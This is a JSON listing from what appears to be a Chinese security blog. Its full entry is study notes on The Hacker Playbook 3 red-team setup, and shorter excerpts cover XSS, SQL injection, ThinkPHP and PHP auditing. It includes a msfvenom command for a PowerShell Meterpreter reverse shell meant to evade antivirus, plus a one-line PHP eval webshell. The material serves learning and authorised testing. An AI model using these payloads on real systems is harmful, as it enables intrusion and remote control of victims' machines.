{"total":42,"pageSize":10,"pageCount":5,"data":[{"title":"THE HACKER PLAYBOOK 3 -- 笔记 -- 安装","slug":"THE-HACKER-PLAYBOOK-3-笔记-安装","date":"2019-03-28T02:05:11.000Z","updated":"2019-03-28T14:17:50.592Z","comments":true,"path":"api/articles/THE-HACKER-PLAYBOOK-3-笔记-安装.json","excerpt":"","keywords":null,"cover":"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/黑客秘籍3/msfvenom_x64_exe.png","content":"<h1 id=\"第一章-赛前准备-–-安装\"><a href=\"#第一章-赛前准备-–-安装\" class=\"headerlink\" title=\"第一章 赛前准备 – 安装\"></a>第一章 赛前准备 – 安装</h1><h3 id=\"前置\"><a href=\"#前置\" class=\"headerlink\" title=\"前置\"></a>前置</h3><p><strong>名词解释：</strong></p>\n<ul>\n<li>检测时效（TTD）：这是从入侵事件的初始发生到安全分析人员检测并开始处理入侵事件之间的时间。</li>\n<li>缓解时效（TTM）：当进行防火墙阻止入侵，DNS污染，或者网络隔绝这些操作的时候，会记录这个时间。</li>\n</ul>\n<p><strong>作者希望读者把注意力集中于：</strong></p>\n<ul>\n<li>应用程序的安全漏洞而不是信息技术的漏洞</li>\n<li>模拟真实世界的入侵事件</li>\n<li>为红队持续的发展做出极大努力</li>\n<li>挑战所有的安全系统…提供真实的数据来证明安全漏洞</li>\n</ul>\n<p><strong><a href=\"https://attack.mitre.org/matrices/enterprise/windows/\" target=\"_blank\" rel=\"noopener\">APT攻击的 ATT&amp;CK 矩阵</a></strong></p>\n<h3 id=\"设定你的行动\"><a href=\"#设定你的行动\" class=\"headerlink\" title=\"设定你的行动\"></a>设定你的行动</h3><p>在红队活动中，我们从几个目标开始。包括但不限于：</p>\n<ul>\n<li>最终的目标是什么？只是APT检测吗？是要在服务器上获取标志吗？是从数据库中获取数据吗？或者只是为了得到检测时效指标？</li>\n<li>是否有我们想要复制的公共活动？</li>\n<li>你会用什么技巧？如MITRE ATT&amp;CK矩阵，在每个类别中确切的技术是什么？<ul>\n<li><a href=\"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/windows-index.md\" target=\"_blank\" rel=\"noopener\">金丝雀研究小组提供了每一种技术的详细信息。</a></li>\n</ul>\n</li>\n<li>客户希望你使用什么工具？是一些诸如Metasploit、Cobalt Strike、DNS Cat这样的商业攻击工具软件？还是自制的定制化工具？</li>\n</ul>\n<p>被抓住也是评估的一部分。。。<br>有一些入侵中作者会被抓4到5次，所以心态要放正。</p>\n<h3 id=\"设置你的外部服务器\"><a href=\"#设置你的外部服务器\" class=\"headerlink\" title=\"设置你的外部服务器\"></a>设置你的外部服务器</h3><p>购买一个合适的VPS。<br>搭建服务器的一个快速方法是集成TrustedSec公司的渗透测试框架（PTF）.<br><a href=\"https://github.com/trustedsec/ptf\" target=\"_blank\" rel=\"noopener\">PTF框架</a>是一些脚本的集合可以为你做大量的艰苦工作并为其他所有内容创建一个框架。</p>\n<ul>\n<li>sudo su -</li>\n<li>apt-get update</li>\n<li>apt-get install python</li>\n<li>git clone <a href=\"https://github.com/trustedsec/ptf\" target=\"_blank\" rel=\"noopener\">https://github.com/trustedsec/ptf</a> /opt/ptf</li>\n<li>cd /opt/pth &amp;&amp; ./ptf</li>\n<li>use modules/exploitation/install_update_all</li>\n<li>use modules/intelligence-gathering/install_update_all</li>\n<li>use modules/post-exploitation/install_update_all</li>\n<li>use modules/powershell/install_update_all</li>\n<li>use modules/vulnerability-analysis/install_update_all</li>\n<li>cd /pentest</li>\n</ul>\n<h3 id=\"红队的核心工具\"><a href=\"#红队的核心工具\" class=\"headerlink\" title=\"红队的核心工具\"></a>红队的核心工具</h3><h4 id=\"Metasploit-框架\"><a href=\"#Metasploit-框架\" class=\"headerlink\" title=\"Metasploit 框架\"></a>Metasploit 框架</h4><p>这个社区驱动的框架，似乎每天更新，拥有所有最新的公开漏洞的利用、后渗透利用模块、辅助模块等等。</p>\n<h5 id=\"混淆-Meterpreter-的-Payload\"><a href=\"#混淆-Meterpreter-的-Payload\" class=\"headerlink\" title=\"混淆 Meterpreter 的 Payload\"></a>混淆 Meterpreter 的 Payload</h5><p>社工时，可能会使用Word或Excel文档作为我们的payload的载体。<br>但是，包含Meterpreter的payload的二进制文件或让目标机器从web下载的操作，会被杀毒软件拦截。<br>所以，我们可以使用PowerShell绕过<br><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/x64/meterpreter_reverse_http -f psh -o meterpreter-64.ps1 LHOST=127.0.0.1 LPORT 555</span><br></pre></td></tr></table></figure></p>\n<p>对比：<br><img src=\"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/黑客秘籍3/msfvenom_x64_exe.png\" alt=\"\"><br><img src=\"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/黑客秘籍3/msfvenom_x64_ps1.png\" alt=\"\"></p>\n<p><a href=\"https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode\" target=\"_blank\" rel=\"noopener\">此外，使用受信任的机构签发的SSL/TLS证书可以帮助我们绕过某些网络中的IDS(入侵检测系统)</a></p>\n<h4 id=\"Cobalt-Strike\"><a href=\"#Cobalt-Strike\" class=\"headerlink\" title=\"Cobalt Strike\"></a>Cobalt Strike</h4><p>主要用在后期持久渗透、横向移动、流量隐藏、数据窃取。<br>此工具没有直接的漏洞利用，也没有通过最新的0-Day漏洞来破坏系统。</p>\n<h5 id=\"Cobalt-Strike基础设施\"><a href=\"#Cobalt-Strike基础设施\" class=\"headerlink\" title=\"Cobalt Strike基础设施\"></a>Cobalt Strike基础设施</h5>","text":"第一章 赛前准备 – 安装前置名词解释：检测时效（TTD）：这是从入侵事件的初始发生到安全分析人员检测并开始处理入侵事件之间的时间。缓解时效（TTM）：当进行防火墙阻止入侵，DNS污染，或者网络隔绝这些操作的时候，会记录这个时间。作者希望读者把注意力集中于：应用程序的安全漏洞而不","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"THE-HACKER-PLAYBOOK-3","slug":"THE-HACKER-PLAYBOOK-3","count":1,"path":"api/tags/THE-HACKER-PLAYBOOK-3.json"}]},{"title":"黑客秘笈-笔记-前置","slug":"黑客秘笈-笔记-前置","date":"2019-03-26T02:47:37.000Z","updated":"2019-03-27T12:18:57.618Z","comments":true,"path":"api/articles/黑客秘笈-笔记-前置.json","excerpt":"<h1 id=\"作者的渗透测试标准\"><a href=\"#作者的渗透测试标准\" class=\"headerlink\" title=\"作者的渗透测试标准\"></a>作者的渗透测试标准</h1><ul>\n<li><ol>\n<li>情报搜集</li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>最初的立足点</li>\n</ol>\n</li>\n<li><ol start=\"3\">\n<li>本地/网络枚举</li>\n</ol>\n</li>\n</ul>","keywords":null,"cover":null,"content":null,"text":"作者的渗透测试标准情报搜集最初的立足点本地/网络枚举本地权限提升持续控制横向渗透域权限提升导出哈希值信息识别/提取撰写报告第一章 安装1.1 建立测试环境Linux服务器或者Windows系统1.2 建立一个域Windows 2012 R12<br>Windows 10<br>W","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"黑客秘笈：渗透测试实用指南","slug":"黑客秘笈：渗透测试实用指南","count":1,"path":"api/tags/黑客秘笈：渗透测试实用指南.json"}]},{"title":"深入理解web漏洞之-XSS跨站脚本攻击","slug":"深入理解web漏洞之-XSS跨站脚本攻击","date":"2019-03-09T12:43:54.000Z","updated":"2019-03-10T04:51:08.502Z","comments":true,"path":"api/articles/深入理解web漏洞之-XSS跨站脚本攻击.json","excerpt":"<h3 id=\"1、什么是XSS跨站脚本攻击\"><a href=\"#1、什么是XSS跨站脚本攻击\" class=\"headerlink\" title=\"1、什么是XSS跨站脚本攻击\"></a>1、什么是XSS跨站脚本攻击</h3><p><strong>百度百科</strong><br>XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被骇客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，骇客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。</p>\n<p><strong>xss常用证明方式：</strong></p>","keywords":null,"cover":"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/深入理解web漏洞/xss_证明.png","content":null,"text":"1、什么是XSS跨站脚本攻击百度百科<br>XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin pol","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"深入理解web漏洞","slug":"深入理解web漏洞","count":2,"path":"api/tags/深入理解web漏洞.json"}]},{"title":"深入理解web漏洞之 SQL注入","slug":"深入理解web漏洞之-SQL注入","date":"2019-03-06T16:03:23.000Z","updated":"2019-03-12T16:25:54.494Z","comments":true,"path":"api/articles/深入理解web漏洞之-SQL注入.json","excerpt":"<h3 id=\"1、什么是-SQL-注入\"><a href=\"#1、什么是-SQL-注入\" class=\"headerlink\" title=\"1、什么是 SQL 注入\"></a>1、什么是 SQL 注入</h3><p><strong>百度百科：</strong><br>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p>","keywords":null,"cover":"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/深入理解web漏洞/sql_buer_6.png","content":null,"text":"1、什么是 SQL 注入百度百科：<br>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"深入理解web漏洞","slug":"深入理解web漏洞","count":2,"path":"api/tags/深入理解web漏洞.json"}]},{"title":"Thinkphp审计之EXP注入","slug":"Thinkphp审计之EXP注入","date":"2019-02-08T07:08:39.000Z","updated":"2019-02-08T08:50:11.684Z","comments":true,"path":"api/articles/Thinkphp审计之EXP注入.json","excerpt":"<h2 id=\"前置知识\"><a href=\"#前置知识\" class=\"headerlink\" title=\"前置知识\"></a>前置知识</h2><blockquote>\n<p>什么是EXP</p>\n</blockquote>\n<p>支持更复杂的查询情况 例如：<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$map[<span class=\"string\">'id'</span>]  = <span class=\"keyword\">array</span>(<span class=\"string\">'in'</span>,<span class=\"string\">'1,3,8'</span>);</span><br></pre></td></tr></table></figure></p>","keywords":null,"cover":"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/PHP代码审计/php_exp_1_lq.png","content":null,"text":"前置知识什么是EXP支持更复杂的查询情况 例如：<br>1<br>$map['id']  = array('in','1,3,8');<br>可以改成：<br>1<br>$map['id']  = array('exp',' IN (1,3,8) ');<br>exp查询的条件不","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"PHP代码审计","slug":"PHP代码审计","count":5,"path":"api/tags/PHP代码审计.json"}]},{"title":"常见漏洞","slug":"常见漏洞","date":"2019-02-05T03:33:31.000Z","updated":"2019-02-06T09:36:13.349Z","comments":true,"path":"api/articles/常见漏洞.json","excerpt":"<h1 id=\"常见漏洞\"><a href=\"#常见漏洞\" class=\"headerlink\" title=\"常见漏洞\"></a>常见漏洞</h1><h2 id=\"命令注入\"><a href=\"#命令注入\" class=\"headerlink\" title=\"命令注入\"></a>命令注入</h2>","keywords":null,"cover":"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/PHP代码审计/php_命令注入.png","content":null,"text":"常见漏洞命令注入 [Figure] 更新用户名的时候，用$_SESSION[&#39;user_id&#39;]而不是用POST[&#39;user&#39;]获取的变量。","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"PHP代码审计","slug":"PHP代码审计","count":5,"path":"api/tags/PHP代码审计.json"}]},{"title":"PHP-常见危险函数","slug":"PHP-常见危险函数","date":"2019-02-03T09:43:50.000Z","updated":"2019-02-04T08:03:47.062Z","comments":true,"path":"api/articles/PHP-常见危险函数.json","excerpt":"<h1 id=\"常见危险函数\"><a href=\"#常见危险函数\" class=\"headerlink\" title=\"常见危险函数\"></a>常见危险函数</h1><h2 id=\"PHP代码执行函数\"><a href=\"#PHP代码执行函数\" class=\"headerlink\" title=\"PHP代码执行函数\"></a>PHP代码执行函数</h2>","keywords":null,"cover":null,"content":null,"text":"常见危险函数PHP代码执行函数mixed eval(string $code)把字符串 $code 作为PHP代码执行<br>很多常见的webshell都是用eval来执行具体操作的<br>比如：<br>1<br>&lt;?php @eval($_POST['cmd']);?&g","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"PHP代码审计","slug":"PHP代码审计","count":5,"path":"api/tags/PHP代码审计.json"}]},{"title":"多线程爬虫","slug":"多线程爬虫","date":"2019-01-27T09:53:12.000Z","updated":"2019-02-04T07:57:48.848Z","comments":true,"path":"api/articles/多线程爬虫.json","excerpt":"<h1 id=\"爬虫教程\"><a href=\"#爬虫教程\" class=\"headerlink\" title=\"爬虫教程\"></a>爬虫教程</h1><h2 id=\"多线程爬虫\"><a href=\"#多线程爬虫\" class=\"headerlink\" title=\"多线程爬虫\"></a>多线程爬虫</h2>","keywords":null,"cover":null,"content":null,"text":"爬虫教程多线程爬虫有些时候，比如下载图片，因为下载图片是一个耗时的操作。如果采用之前那种同步的方式下载。那效率肯会特别慢。这时候我们就可以考虑使用多线程的方式来下载图片。多线程介绍：<br>多线程是为了同步完成多项任务，通过提高资源使用效率来提高系统的效率。线程是在同一时间需要完","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"python_爬虫","slug":"python-爬虫","count":1,"path":"api/tags/python-爬虫.json"}]},{"title":"app中的加密与解密","slug":"app中的加密与解密","date":"2019-01-21T09:26:19.000Z","updated":"2019-02-04T08:05:44.110Z","comments":true,"path":"api/articles/app中的加密与解密.json","excerpt":"<h2 id=\"App渗透中常见的加密与解密\"><a href=\"#App渗透中常见的加密与解密\" class=\"headerlink\" title=\"App渗透中常见的加密与解密\"></a>App渗透中常见的加密与解密</h2><pre><code>本文主要介绍了目前App数据传输过程中几种常见的加密方式，以及一些常规的解密手段，\n并不涵盖并应对所有情况，在实战过程中还须具体情况具体分析，随机应变；\n（注：全文中所提到的App仅针对Android App）\n</code></pre>","keywords":null,"cover":"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/APP逆向/app_raw.png","content":null,"text":"App渗透中常见的加密与解密本文主要介绍了目前App数据传输过程中几种常见的加密方式，以及一些常规的解密手段，并不涵盖并应对所有情况，在实战过程中还须具体情况具体分析，随机应变；（注：全文中所提到的App仅针对Android App）随着App移动应用的广泛应用及移动开发技术的飞","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"App","slug":"App","count":1,"path":"api/tags/App.json"}]},{"title":"CTF线下赛总结","slug":"CTF线下赛总结","date":"2019-01-03T07:21:43.000Z","updated":"2019-01-03T09:07:12.905Z","comments":true,"path":"api/articles/CTF线下赛总结.json","excerpt":"<h1 id=\"CTF线下攻防赛\"><a href=\"#CTF线下攻防赛\" class=\"headerlink\" title=\"CTF线下攻防赛\"></a>CTF线下攻防赛</h1>","keywords":null,"cover":"https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/CTF/1707042315cda976443f9eca49.png","content":null,"text":"CTF线下攻防赛 [Figure] http://www.freebuf.com/articles/web/96675.html总结CTF能够给不能层次的人在技术上带来提高。没有网络信息安全基础的学生通过CTF，建立了安全攻防的概念；有初步基础的学生，通过高质量赛题的实践练习，提","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"CTF思路","slug":"CTF思路","count":1,"path":"api/tags/CTF思路.json"}]}]}